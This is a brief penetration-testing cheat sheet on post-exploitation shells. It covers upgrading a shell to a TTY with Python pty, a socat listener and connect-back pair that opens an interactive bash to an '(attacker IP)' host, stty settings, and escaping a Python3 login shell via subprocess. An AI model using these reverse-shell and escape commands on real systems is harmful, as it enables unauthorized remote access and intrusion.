# Post Exploitation Shell Cheat Sheet
All techniques that I use each day during penetration testing are in this module.
## Upgrading shell to a TTY
This section of this module focuses on how to upgrade your nonTTY shell using various methods and resources located on the target system.
### Using Python:
To use Python to upgrade to a TTY from your spanwed shell do,

`python -c 'import pty; pty.spawn("/bin/bash")'`

### Using SOCAT:
To use Socat, first start the listener on the attacker machine with,

`socat file:`tty`,raw,echo=0 tcp-listen:4444`

Then, start the bind from the target machine with,

`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:(attacker IP):4444`

### Using STTY:
`reset`

`export SHELL=bash`

`export TERM=xterm-256color`
## Escaping Python3 Shell
If Python3 is listed as the shell type for a user in the `/etc/passwd` file like so,
```
daniel:x:1002:1005::/home/daniel:/usr/bin/python3
```
You can simply escape the Python3 `>>>` shell with the following two commands,
```
>>> import subprocess
>>> subprocess.call("/bin/bash")
```
This might be sueful to drop you back to a normal LINUX Bash shell if required, or to make further enumeration easier.
